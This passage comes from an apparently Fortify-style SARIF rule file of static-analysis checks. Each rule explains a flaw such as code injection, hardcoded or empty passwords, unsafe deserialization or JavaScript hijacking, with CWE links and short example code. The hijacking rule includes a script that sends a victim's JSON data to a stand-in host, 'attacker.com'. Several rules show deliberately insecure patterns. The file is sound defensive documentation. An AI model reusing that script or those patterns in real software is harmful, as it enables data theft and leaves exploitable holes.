                "text": "Appending user-controlled data to a `StringBuilder` instance initialized with the default backing character array size (16) can cause the application to consume large amounts of heap memory while resizing the underlying array to fit user's data. Everytime new data is appended to a `StringBuilder` instance, it will try to fit it on its backing character array. If data does not fit, a new array will be created doubling the previous size while the old array will remain in the heap until it is garbage collected. This defect can be used to execute a Denial of Service (DoS) attack.\r\n\r\n**Example 1: **User-controlled data is appended to a `StringBuilder` instance initialized with the default constructor. \n`\n    ...\n    StringBuilder sb = new StringBuilder();\n    sb.append(request.getParameter(\"foo\"));\n    ...\n`"
              },
              "defaultConfiguration": {
                "properties": {
                  "DefaultSeverity": "3.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "None",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "3.0",
                "Impact": "2.0",
                "Probability": "2.0"
              }
            },
            {
              "id": "A9F48CBB-29DD-4C4C-BFA6-5CC9286636A80",
              "guid": "A9F48CBB-29DD-4C4C-BFA6-5CC9286636A8",
              "name": "Input Validation and Representation/Dynamic Code Evaluation/Code Injection",
              "shortDescription": {
                "text": "The file {PrimaryLocation.file} interprets unvalidated user input as source code on line {PrimaryLocation.line}. Interpreting user-controlled instructions at run-time can allow attackers to execute malicious code.\r\nInterpreting user-controlled instructions at run-time can allow attackers to execute malicious code."
              },
              "fullDescription": {
                "text": "Many modern programming languages allow dynamic interpretation of source instructions. This capability allows programmers to perform dynamic instructions based on input received from the user. Code injection vulnerabilities occur when the programmer incorrectly assumes that instructions supplied directly from the user will perform only innocent operations, such as performing simple calculations on active user objects or otherwise modifying the user's state. However, without proper validation, a user might specify operations the programmer does not intend.\r\n\r\nEven though the data in this case is a number, it is unvalidated and thus still considered malicious, hence the vulnerability is still reported but with reduced priority values.\r\n\r\n**Example:** In this classic code injection example, the application implements a basic calculator that allows the user to specify commands for execution.\r\n\r\n`\n...\n\tuserOp = form.operation.value;\n\tcalcResult = eval(userOp);\n...\n`\r\n\r\nThe program behaves correctly when the `operation` parameter is a benign value, such as &quot;8 + 7 * 2&quot;, in which case the `calcResult` variable is assigned a value of 22. However, if an attacker specifies languages operations that are both valid and malicious, those operations would be executed with the full privilege of the parent process. Such attacks are even more dangerous when the underlying language provides access to system resources or allows execution of system commands. In the case of JavaScript, the attacker may utilize this vulnerability to perform a cross-site scripting attack."
              },
              "defaultConfiguration": {
                "level": "error",
                "properties": {
                  "DefaultSeverity": "4.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "95",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                },
                {
                  "target": {
                    "id": "494",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "4.0",
                "Impact": "5.0",
                "Probability": "4.0"
              }
            },
            {
              "id": "DD48C0E5-3651-4DF1-9BE8-EB989C64E33A",
              "guid": "DD48C0E5-3651-4DF1-9BE8-EB989C64E33A",
              "name": "Security Features/Password Management/Hardcoded Password",
              "shortDescription": {
                "text": "Hardcoded passwords may compromise system security in a way that cannot be easily remedied."
              },
              "fullDescription": {
                "text": "It is never a good idea to hardcode a password. Not only does hardcoding a password allow all of the project's developers to view the password, it also makes fixing the problem extremely difficult. Once the code is in production, the password cannot be changed without patching the software. If the account protected by the password is compromised, the owners of the system will be forced to choose between security and availability.\r\n\r\nIn this case a hardcoded password was found in the call to <Replace key=\"PrimaryCall.name\" link=\"PrimaryLocation\"/> in {PrimaryLocation.file} at line {PrimaryLocation.line}.\r\n\r\n**Example 1:** The following code uses a hardcoded password to connect to a database:\r\n\r\n`\n...\nDriverManager.getConnection(url, \"scott\", \"tiger\");\n...\n`\r\n\r\nThis code will run successfully, but anyone who has access to it will have access to the password. Once the program has shipped, there is likely no way to change the database user \"scott\" with a password of \"tiger\" unless the program is patched. An employee with access to this information could use it to break into the system. Even worse, if attackers have access to the bytecode for the application they can use the `javap -c` command to access the disassembled code, which will contain the values of the passwords used. The result of this operation might look something like the following for the example above:\r\n\r\n`\njavap -c ConnMngr.class\r\n\r\n22: ldc   #36; //String jdbc:mysql://ixne.com/rxsql\n24: ldc   #38; //String scott\n26: ldc   #17; //String tiger\n`\r\n\r\nIn the mobile world, password management is even trickier, considering a much higher chance of device loss.\n**Example 2:** The code below uses hardcoded username and password to setup authentication for viewing protected pages with Android's WebView.\n`\n...\nwebview.setWebViewClient(new WebViewClient() {\n  public void onReceivedHttpAuthRequest(WebView view,\n        HttpAuthHandler handler, String host, String realm) {\n    handler.proceed(\"guest\", \"allow\");\n  }\n});\n...\n`\r\n\r\nSimilar to Example 1, this code will run successfully, but anyone who has access to it will have access to the password."
              },
              "defaultConfiguration": {
                "level": "error",
                "properties": {
                  "DefaultSeverity": "3.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "259",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                },
                {
                  "target": {
                    "id": "798",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "3.0",
                "Impact": "4.0",
                "Probability": "4.0"
              }
            },
            {
              "id": "720E3A66-55AC-4D2D-8DB9-DC30E120A52F",
              "guid": "720E3A66-55AC-4D2D-8DB9-DC30E120A52F",
              "name": "Security Features/Password Management/Password in Comment",
              "shortDescription": {
                "text": "Storing passwords or password details in plaintext anywhere in the system or system code may compromise system security in a way that cannot be easily remedied."
              },
              "fullDescription": {
                "text": "It is never a good idea to hardcode a password. Storing password details within comments is equivalent to hardcoding passwords. Not only does it allow all of the project's developers to view the password, it also makes fixing the problem extremely difficult. Once the code is in production, the password is now leaked to the outside world and cannot be protected or changed without patching the software. If the account protected by the password is compromised, the owners of the system will be forced to choose between security and availability.\r\n\r\nIn this case the password details appear in the comment in {PrimaryLocation.file} at line {PrimaryLocation.line}.\r\n\r\n**Example:** The following comment specifies the default password to connect to a database:\r\n\r\n`\n...\n// Default username for database connection is \"scott\"\n// Default password for database connection is \"tiger\"\n...\n`\r\n\r\nThis code will run successfully, but anyone who has access to it will have access to the password. Once the program has shipped, there is likely no way to change the database user \"scott\" with a password of \"tiger\" unless the program is patched. An employee with access to this information could use it to break into the system."
              },
              "defaultConfiguration": {
                "properties": {
                  "DefaultSeverity": "2.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "615",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "1.0",
                "Impact": "2.0",
                "Probability": "3.0"
              }
            },
            {
              "id": "85E603E0-2933-4F38-851F-341604F75CB9",
              "guid": "85E603E0-2933-4F38-851F-341604F75CB9",
              "name": "Errors/Poor Error Handling/Overly Broad Catch",
              "shortDescription": {
                "text": "The catch block at {PrimaryLocation.file} line {PrimaryLocation.line} handles a broad swath of exceptions,  potentially trapping dissimilar issues or problems that should not be dealt with at this point in the program.\r\nThe catch block handles a broad swath of exceptions, potentially trapping dissimilar issues or problems that should not be dealt with at this point in the program."
              },
              "fullDescription": {
                "text": "Multiple catch blocks can get ugly and repetitive, but \"condensing\" catch blocks by catching a high-level class like `Exception` can obscure exceptions that deserve special treatment or that should not be caught at this point in the program. Catching an overly broad exception essentially defeats the purpose of Java's typed exceptions, and can become particularly dangerous if the program grows and begins to throw new types of exceptions. The new exception types will not receive any attention.\r\n\r\n**Example:** The following code excerpt handles three types of exceptions in an identical fashion.\r\n\r\n`\n  try {\n    doExchange();\n  }\n  catch (IOException e) {\n    logger.error(\"doExchange failed\", e);\n  }\n  catch (InvocationTargetException e) {\n    logger.error(\"doExchange failed\", e);\n  }\n  catch (SQLException e) {\n    logger.error(\"doExchange failed\", e);\n  }\n`\r\n\r\nAt first blush, it may seem preferable to deal with these exceptions in a single catch block, as follows:\r\n\r\n`\n  try {\n    doExchange();\n  }\n  catch (Exception e) {\n    logger.error(\"doExchange failed\", e);\n  }\n`\r\n\r\nHowever, if `doExchange()` is modified to throw a new type of exception that should be handled in some different kind of way, the broad catch block will prevent the compiler from pointing out the situation. Further, the new catch block will now also handle exceptions derived from `RuntimeException` such as `ClassCastException`, and `NullPointerException`, which is not the programmer's intent."
              },
              "defaultConfiguration": {
                "properties": {
                  "DefaultSeverity": "2.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "396",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "5.0",
                "Impact": "2.0",
                "Probability": "1.0"
              }
            },
            {
              "id": "59DB783C-E130-4A79-A89D-75DAC707D601",
              "guid": "59DB783C-E130-4A79-A89D-75DAC707D601",
              "name": "Security Features/Key Management/Hardcoded Encryption Key",
              "shortDescription": {
                "text": "Hardcoded encryption keys may compromise system security in a way that cannot be easily remedied."
              },
              "fullDescription": {
                "text": "It is never a good idea to hardcode an encryption key because it allows all of the project's developers to view the encryption key, and makes fixing the problem extremely difficult. Once the code is in production, the encryption key cannot be changed without patching the software. If the account that is protected by the encryption key is compromised, the owners of the system will be forced to choose between security and availability.\r\n\r\nIn this case the encryption key is located at <Replace key=\"PrimaryCall.name\" link=\"PrimaryLocation\"/> in {PrimaryLocation.file} at line {PrimaryLocation.line}.\r\n\r\n**Example 1:** The following code uses a hardcoded encryption key:\r\n\r\n`\n...\nprivate static final String encryptionKey = \"lakdsljkalkjlksdfkl\";\nbyte[] keyBytes = encryptionKey.getBytes();\nSecretKeySpec key = new SecretKeySpec(keyBytes, \"AES\");\nCipher encryptCipher = Cipher.getInstance(\"AES\");\nencryptCipher.init(Cipher.ENCRYPT_MODE, key);\n...\n`\r\n\r\nAnyone who has access to the code will have access to the encryption key. Once the application has shipped, there is no way to change the encryption key unless the program is patched. An employee with access to this information could use it to break into the system. Even worse, if attackers had access to the executable for the application, they could extract the encryption key value."
              },
              "defaultConfiguration": {
                "properties": {
                  "DefaultSeverity": "4.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "321",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "4",
                "Impact": "3.0",
                "Probability": "4.0"
              }
            },
            {
              "id": "0E2798F4-EFFE-4390-A6F5-FFBD9DC071B8",
              "guid": "0E2798F4-EFFE-4390-A6F5-FFBD9DC071B8",
              "name": "Code Quality/Dead Code/Expression is Always false",
              "shortDescription": {
                "text": "The expression (or part of it) at {PrimaryLocation.file} line {PrimaryLocation.line} will always evaluate to `false`.\r\nThis expression (or part of it) will always evaluate to `false`."
              },
              "fullDescription": {
                "text": "This expression (or part of it) will always evaluate to `false`; the program could be rewritten in a simpler form. The nearby code may be present for debugging purposes, or it may not have been maintained along with the rest of the program. The expression may also be indicative of a bug earlier in the method.\r\n\r\n**Example 1:** The following method never sets the variable `secondCall` after initializing it to `false`. (The variable `firstCall` is mistakenly used twice.)  The result is that the expression `firstCall &amp;&amp; secondCall` will always evaluate to `false`, so `setUpDualCall()` will never be invoked.\r\n\r\n`\npublic void setUpCalls() {\n  boolean firstCall = false;\n  boolean secondCall = false;\r\n\r\n  if (fCall &gt; 0) {\n    setUpFCall();\n    firstCall = true;\n  }\n  if (sCall &gt; 0) {\n    setUpSCall();\n    firstCall = true;\n  }\r\n\r\n  if (firstCall &amp;&amp; secondCall) {\n    setUpDualCall();\n  }\n}\n`\r\n\r\n**Example 2:** The following method never sets the variable `firstCall` to `true`. (The variable `firstCall` is mistakenly set to `false` after the first conditional statement.)  The result is that the first part of the expression `firstCall &amp;&amp; secondCall` will always evaluate to `false`.\r\n\r\n`\npublic void setUpCalls() {\n  boolean firstCall = false;\n  boolean secondCall = false;\r\n\r\n  if (fCall &gt; 0) {\n    setUpFCall();\n    firstCall = false;\n  }\n  if (sCall &gt; 0) {\n    setUpSCall();\n    secondCall = true;\n  }\r\n\r\n  if (firstCall || secondCall) {\n    setUpForCall();\n  }\n}\n`"
              },
              "defaultConfiguration": {
                "level": "note",
                "properties": {
                  "DefaultSeverity": "2.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "570",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "3.0",
                "Impact": "1.0",
                "Probability": "1.0"
              }
            },
            {
              "id": "550A858A-55E7-4358-B081-19D66E082EBD",
              "guid": "550A858A-55E7-4358-B081-19D66E082EBD",
              "name": "Input Validation and Representation/Dynamic Code Evaluation/Unsafe Deserialization",
              "shortDescription": {
                "text": "Deserializing user-controlled object streams at runtime can allow attackers to execute arbitrary code on the server, abuse application logic, and/or lead to denial of service."
              },
              "fullDescription": {
                "text": "Java serialization turns object graphs into byte streams containing the objects themselves and the necessary metadata to reconstruct them from the byte stream. Developers can create custom code to aid in the process of deserializing Java objects, where they may even replace the deserialized objects with different objects, or proxies. The customized deserialization process takes place during objects reconstruction before the objects are returned to the application and cast into expected types. By the time developers try to enforce an expected type, code may have already been executed. \r\n\r\nCustom deserialization routines are defined in the serializable classes which need to be present in the runtime classpath and cannot be injected by the attacker so the exploitability of these attacks depends on the classes available in the application environment. Unfortunately, common third party classes or even JDK classes can be abused to exhaust JVM resources, deploy malicious files, or run arbitrary code.\r\n\r\nCertain Spring service exporters use Java serialization behind the scenes at the transport layer. RMI, JMSInvoker and HTTPInvoker are examples of these services.\r\n\r\n**Example 1:** RMIServiceExporter exposing `TestService` methods.\n`\n&lt;bean id=\"testService\" class=\"example.TestServiceImpl\"/&gt;\n&lt;bean class=\"org.springframework.remoting.rmi.RmiServiceExporter\"&gt;\n    &lt;property name=\"serviceName\" value=\"TestService\"/&gt;\n    &lt;property name=\"service\" ref=\"testService\"/&gt;\n    &lt;property name=\"serviceInterface\" value=\"example.TestService\"/&gt;\n    &lt;property name=\"registryPort\" value=\"1199\"/&gt;\n&lt;/bean&gt;\n`\r\n\r\n**Example 2:** JMSInvokerServiceExporter exposing `TestService` methods.\n`\n&lt;bean id=\"testService\" class=\"example.TestServiceImpl\"/&gt;\n&lt;bean class=\"org.springframework.jms.remoting.JmsInvokerServiceExporter\"&gt;\n        &lt;property name=\"serviceInterface\" value=\"example.TestService\"/&gt;\n        &lt;property name=\"service\" ref=\"testService\"/&gt;\n&lt;/bean&gt;\n`\r\n\r\n**Example 3:** HTTPInvokerServiceExporter exposing `TestService` methods.\n`\n&lt;bean id=\"testService\" class=\"example.TestServiceImpl\"/&gt;\n&lt;bean class=\"org.springframework.remoting.httpinvoker.HttpInvokerServiceExporter\"&gt;\n        &lt;property name=\"serviceInterface\" value=\"example.TestService\"/&gt;\n        &lt;property name=\"service\" ref=\"testService\"/&gt;\n&lt;/bean&gt;\n`"
              },
              "defaultConfiguration": {
                "level": "error",
                "properties": {
                  "DefaultSeverity": "5.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "502",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "4.0",
                "Impact": "5.0",
                "Probability": "4.0"
              }
            },
            {
              "id": "8bd01c50-a769-11de-8a39-0800200c9a66",
              "guid": "8bd01c50-a769-11de-8a39-0800200c9a66",
              "name": "Security Features/Password Management/Empty Password",
              "shortDescription": {
                "text": "Empty passwords may compromise system security in a way that cannot be easily remedied."
              },
              "fullDescription": {
                "text": "It is never a good idea to assign an empty string to a password variable. If the empty password is used to successfully authenticate against another system, then the corresponding account's security is likely compromised because it accepts an empty password. If the empty password is merely a placeholder until a legitimate value can be assigned to the variable, then it can confuse anyone unfamiliar with the code and potentially cause problems on unexpected control flow paths.\r\n\r\nIn this case an empty password was found in the call to <Replace key=\"PrimaryCall.name\" link=\"PrimaryLocation\"/> in {PrimaryLocation.file} at line {PrimaryLocation.line}.\r\n\r\n**Example 1:** The code below attempts to connect to a database with an empty password.\n`\n    ...\n    DriverManager.getConnection(url, \"scott\", \"\");\n    ...\n`\r\n\r\nIf the code in Example 1 succeeds, it indicates that the database user account \"scott\" is configured with an empty password, which can be easily guessed by an attacker. Even worse, once the program has shipped, updating the account to use a non-empty password will require a code change.\r\n\r\n**Example 2:** The code below initializes a password variable to an empty string, attempts to read a stored value for the password, and compares it against a user-supplied value.\r\n\r\n`\n    ...\n    String storedPassword = \"\";\n    String temp;\r\n\r\n    if ((temp = readPassword()) != null) {\n        storedPassword = temp;\n    }\r\n\r\n    if(storedPassword.equals(userPassword))\n        // Access protected resources\n        ...\n    }\n    ...\n`\r\n\r\nIf `readPassword()` fails to retrieve the stored password due to a database error or another problem, then an attacker could trivially bypass the password check by providing an empty string for `userPassword`.\r\n\r\nIn the mobile world, password management is even trickier, considering a much higher chance of device loss.\n**Example 3:** The code below initializes username and password variables to empty strings, reads credentials from an Android WebView store if they have not been previously rejected by the server for the current request, and uses them to setup authentication for viewing protected pages.\n`\n...\nwebview.setWebViewClient(new WebViewClient() {\n  public void onReceivedHttpAuthRequest(WebView view,\n        HttpAuthHandler handler, String host, String realm) {\n    String username = \"\";\n    String password = \"\";\r\n\r\n    if (handler.useHttpAuthUsernamePassword()) {\n      String[] credentials = view.getHttpAuthUsernamePassword(host, realm);\n      username = credentials[0];\n      password = credentials[1];\n    }\n    handler.proceed(username, password);\n  }\n});\n...\n`\r\n\r\nSimilar to Example 2, if `useHttpAuthUsernamePassword()` returns `false`, an attacker will be able to view protected pages by supplying an empty password."
              },
              "defaultConfiguration": {
                "level": "error",
                "properties": {
                  "DefaultSeverity": "4.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "259",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "4",
                "Impact": "4.0",
                "Probability": "3.0"
              }
            },
            {
              "id": "D046CB8A-8C3C-45BC-AB8D-57CB03636EB4",
              "guid": "D046CB8A-8C3C-45BC-AB8D-57CB03636EB4",
              "name": "Encapsulation/JavaScript Hijacking/Vulnerable Framework",
              "shortDescription": {
                "text": "Applications that use JavaScript notation to transport sensitive data can be vulnerable to JavaScript hijacking, which allows an unauthorized attacker to read confidential data from a vulnerable application."
              },
              "fullDescription": {
                "text": "An application may be vulnerable to JavaScript hijacking if it: 1) Uses JavaScript objects as a data transfer format 2) Handles confidential data. Because JavaScript hijacking vulnerabilities do not occur as a direct result of a coding mistake, the Fortify Secure Coding Rulepacks call attention to potential JavaScript hijacking vulnerabilities by identifying code that appears to generate JavaScript in an HTTP response.\r\n\r\nWeb browsers enforce the Same Origin Policy in order to protect users from malicious websites. The Same Origin Policy requires that, in order for JavaScript to access the contents of a web page, both the JavaScript and the web page must originate from the same domain. Without the Same Origin Policy, a malicious website could serve up JavaScript that loads sensitive information from other websites using a client's credentials, culls through it, and communicates it back to the attacker. JavaScript hijacking allows an attacker to bypass the Same Origin Policy in the case that a web application uses JavaScript to communicate confidential information. The loophole in the Same Origin Policy is that it allows JavaScript from any website to be included and executed in the context of any other website. Even though a malicious site cannot directly examine any data loaded from a vulnerable site on the client, it can still take advantage of this loophole by setting up an environment that allows it to witness the execution of the JavaScript and any relevant side effects it may have. Since many Web 2.0 applications use JavaScript as a data transport mechanism, they are often vulnerable while traditional web applications are not.\r\n\r\nThe most popular format for communicating information in JavaScript is JavaScript Object Notation (JSON). The JSON RFC defines JSON syntax to be a subset of JavaScript object literal syntax. JSON is based on two types of data structures: arrays and objects. Any data transport format where messages can be interpreted as one or more valid JavaScript statements is vulnerable to JavaScript hijacking. JSON makes JavaScript hijacking easier by the fact that a JSON array stands on its own as a valid JavaScript statement. Since arrays are a natural form for communicating lists, they are commonly used wherever an application needs to communicate multiple values. Put another way, a JSON array is directly vulnerable to JavaScript hijacking. A JSON object is only vulnerable if it is wrapped in some other JavaScript construct that stands on its own as a valid JavaScript statement.\r\n\r\n**Example 1:** The following example begins by showing a legitimate JSON interaction between the client and server components of a web application used to manage sales leads. It goes on to show how an attacker may mimic the client and gain access to the confidential data the server returns. Note that this example is written for Mozilla-based browsers. Other mainstream browsers do not allow native constructors to be overridden when an object is created without the use of the new operator.\r\n\r\nThe client requests data from a server and evaluates the result as JSON with the following code:\r\n\r\n`\nvar object;\nvar req = new XMLHttpRequest();\nreq.open(\"GET\", \"/object.json\",true);\nreq.onreadystatechange = function () {\n  if (req.readyState == 4) {\n    var txt = req.responseText;\n    object = eval(\"(\" + txt + \")\");\n    req = null;\n  }\n};\nreq.send(null);\n`\r\n\r\nWhen the code runs, it generates an HTTP request that looks like this:\r\n\r\n`\nGET /object.json HTTP/1.1\n...\nHost: www.example.com\nCookie: JSESSIONID=F2rN6HopNzsfXFjHX1c5Ozxi0J5SQZTr4a5YJaSbAiTnRR\n`\r\n\r\n(In this HTTP response and the one that follows we have elided HTTP headers that are not directly relevant to this explanation.)\nThe server responds with an array in JSON format:\r\n\r\n`\nHTTP/1.1 200 OK\nCache-control: private\nContent-Type: text/JavaScript; charset=utf-8\n...\n[{\"fname\":\"Brian\", \"lname\":\"Chess\", \"phone\":\"6502135600\",\n  \"purchases\":60000.00, \"email\":\"brian@example.com\" },\n {\"fname\":\"Katrina\", \"lname\":\"O'Neil\", \"phone\":\"6502135600\",\n  \"purchases\":120000.00, \"email\":\"katrina@example.com\" },\n {\"fname\":\"Jacob\", \"lname\":\"West\", \"phone\":\"6502135600\",\n  \"purchases\":45000.00, \"email\":\"jacob@example.com\" }]\n`\r\n\r\nIn this case, the JSON contains confidential information associated with the current user (a list of sales leads). Other users cannot access this information without knowing the user's session identifier. (In most modern web applications, the session identifier is stored as a cookie.) However, if a victim visits a malicious website, the malicious site can retrieve the information using JavaScript hijacking. If a victim can be tricked into visiting a web page that contains the following malicious code, the victim's lead information will be sent to the attacker's web site.\r\n\r\n`\n&lt;script&gt;\n// override the constructor used to create all objects so\n// that whenever the \"email\" field is set, the method\n// captureObject() will run. Since \"email\" is the final field,\n// this will allow us to steal the whole object.\nfunction Object() {\n this.email setter = captureObject;\n}\r\n\r\n// Send the captured object back to the attacker's web site\nfunction captureObject(x) {\n  var objString = \"\";\n  for (fld in this) {\n    objString += fld + \": \" + this[fld] + \", \";\n  }\n  objString += \"email: \" + x;\n  var req = new XMLHttpRequest();\n  req.open(\"GET\", \"http://attacker.com?obj=\" +\n           escape(objString),true);\n  req.send(null);\n}\n&lt;/script&gt;\r\n\r\n&lt;!-- Use a script tag to bring in victim's data --&gt;\n&lt;script src=\"http://www.example.com/object.json\"&gt;&lt;/script&gt;\n`\r\n\r\nThe malicious code uses a script tag to include the JSON object in the current page. The web browser will send up the appropriate session cookie with the request. In other words, this request will be handled just as though it had originated from the legitimate application.\r\n\r\nWhen the JSON array arrives on the client, it will be evaluated in the context of the malicious page. In order to witness the evaluation of the JSON, the malicious page has redefined the JavaScript function used to create new objects. In this way, the malicious code has inserted a hook that allows it to get access to the creation of each object and transmit the object's contents back to the malicious site. Other attacks might override the default constructor for arrays instead. Applications that are built to be used in a mashup sometimes invoke a callback function at the end of each JavaScript message. The callback function is meant to be defined by another application in the mashup. A callback function makes a JavaScript hijacking attack a trivial affair -- all the attacker has to do is define the function. An application can be mashup-friendly or it can be secure, but it cannot be both. If the user is not logged into the vulnerable site, the attacker may compensate by asking the user to log in and then displaying the legitimate login page for the application.\r\n\r\nThis is not a phishing attack -- the attacker does not gain access to the user's credentials -- so anti-phishing countermeasures will not be able to defeat the attack. More complex attacks could make a series of requests to the application by using JavaScript to dynamically generate script tags. This same technique is sometimes used to create application mashups. The only difference is that, in this mashup scenario, one of the applications involved is malicious."
              },
              "defaultConfiguration": {
                "level": "note",
                "properties": {
                  "DefaultSeverity": "2.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "None",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "2.0",
                "Impact": "1.0",
                "Probability": "1.0"
              }
            },
            {
              "id": "97B9518A-F1BC-44CE-BEB1-D5FBDDFCCF9D",
              "guid": "97B9518A-F1BC-44CE-BEB1-D5FBDDFCCF9D",
              "name": "Encapsulation/System Information Leak/Incomplete Servlet Error Handling",
              "shortDescription": {
                "text": "The servlet {EnclosingClass.name} fails to catch all exceptions in {EnclosingFunction.name}. If a Servlet fails to catch all exceptions, it might reveal debugging information that will help an adversary form a plan of attack.\r\nIf a Servlet fails to catch all exceptions, it might reveal debugging information that will help an adversary form a plan of attack."
              },
              "fullDescription": {
                "text": "When a Servlet throws an exception, the default error response the Servlet container sends back to the user typically includes debugging information. This information is of great value to an attacker. For example, a stack trace might show the attacker a malformed SQL query string, the type of database being used, and the version of the application container. This information enables the attacker to target known vulnerabilities in these components.\r\n\r\n**Example 1:** In the following method a DNS lookup failure will cause the Servlet to throw an exception.\r\n\r\n`\nprotected void doPost (HttpServletRequest req,\n                    HttpServletResponse res)\n              throws IOException {\n    String ip = req.getRemoteAddr();\n    InetAddress addr = InetAddress.getByName(ip);\n    ...\n    out.println(\"hello \" + addr.getHostName());\n}\n`\r\n\r\n**Example 2:** The following method will throw a `NullPointerException` if the parameter \"name\" is not part of the request.\r\n\r\n`\nprotected void doPost (HttpServletRequest req,\n                    HttpServletResponse res)\n              throws IOException {\n    String name = getParameter(\"name\");\n    ...\n    out.println(\"hello \" + name.trim());\n}\n`"
              },
              "defaultConfiguration": {
                "properties": {
                  "DefaultSeverity": "3.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "209",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                },
                {
                  "target": {
                    "id": "431",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "3.0",
                "Impact": "2.0",
                "Probability": "1.0"
              }
            },
            {
              "id": "F5C892D5-C429-4B38-BDE6-AB04A5D1BAEF",
              "guid": "F5C892D5-C429-4B38-BDE6-AB04A5D1BAEF",
              "name": "Security Features/Password Management/Hardcoded Password",
              "shortDescription": {
                "text": "Hardcoded passwords may compromise system security in a way that cannot be easily remedied."
              },
              "fullDescription": {
                "text": "It is never a good idea to hardcode a password. Not only does hardcoding a password allow all of the project's developers to view the password, it also makes fixing the problem extremely difficult. Once the code is in production, the password cannot be changed without patching the software. If the account protected by the password is compromised, the owners of the system will be forced to choose between security and availability.\r\n\r\nIn this case a hardcoded password was found in the call to <Replace key=\"PrimaryCall.name\" link=\"PrimaryLocation\"/> in {PrimaryLocation.file} at line {PrimaryLocation.line}.\r\n\r\n**Example 1:** The following code uses a hardcoded password to connect to a database:\r\n\r\n`\n...\nDriverManager.getConnection(url, \"scott\", \"tiger\");\n...\n`\r\n\r\nThis code will run successfully, but anyone who has access to it will have access to the password. Once the program has shipped, there is likely no way to change the database user \"scott\" with a password of \"tiger\" unless the program is patched. An employee with access to this information could use it to break into the system. Even worse, if attackers have access to the bytecode for the application they can use the `javap -c` command to access the disassembled code, which will contain the values of the passwords used. The result of this operation might look something like the following for the example above:\r\n\r\n`\njavap -c ConnMngr.class\r\n\r\n22: ldc   #36; //String jdbc:mysql://ixne.com/rxsql\n24: ldc   #38; //String scott\n26: ldc   #17; //String tiger\n`\r\n\r\nIn the mobile world, password management is even trickier, considering a much higher chance of device loss.\n**Example 2:** The code below uses hardcoded username and password to setup authentication for viewing protected pages with Android's WebView.\n`\n...\nwebview.setWebViewClient(new WebViewClient() {\n  public void onReceivedHttpAuthRequest(WebView view,\n        HttpAuthHandler handler, String host, String realm) {\n    handler.proceed(\"guest\", \"allow\");\n  }\n});\n...\n`\r\n\r\nSimilar to Example 1, this code will run successfully, but anyone who has access to it will have access to the password."
              },
              "defaultConfiguration": {
                "level": "error",
                "properties": {
                  "DefaultSeverity": "3.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "259",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                },
                {
                  "target": {
                    "id": "798",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "3.0",
                "Impact": "4.0",
                "Probability": "4.0"
              }
            },
            {
              "id": "9C5BD1B5-C296-48d4-B5F5-5D2958661BC4",
              "guid": "9C5BD1B5-C296-48d4-B5F5-5D2958661BC4",
              "name": "Security Features/Password Management/Hardcoded Password",
              "shortDescription": {
